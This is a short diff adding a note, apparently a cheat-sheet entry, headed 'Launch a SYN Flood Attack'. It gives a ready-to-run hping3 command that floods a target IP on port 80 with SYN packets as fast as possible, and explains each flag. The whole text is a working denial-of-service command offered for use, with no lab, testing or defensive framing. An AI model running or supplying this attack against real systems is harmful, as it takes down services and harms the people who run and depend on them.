@@ -1,0 +1,8 @@
+Launch a SYN Flood Attack:
+sudo hping3 -S --flood -V -p 80 <target-ip>
+
+
+-S: Set SYN flag.
+--flood: Send packets as fast as possible.
+-V: Verbose mode.
+-p 80: Target port 80 (HTTP).
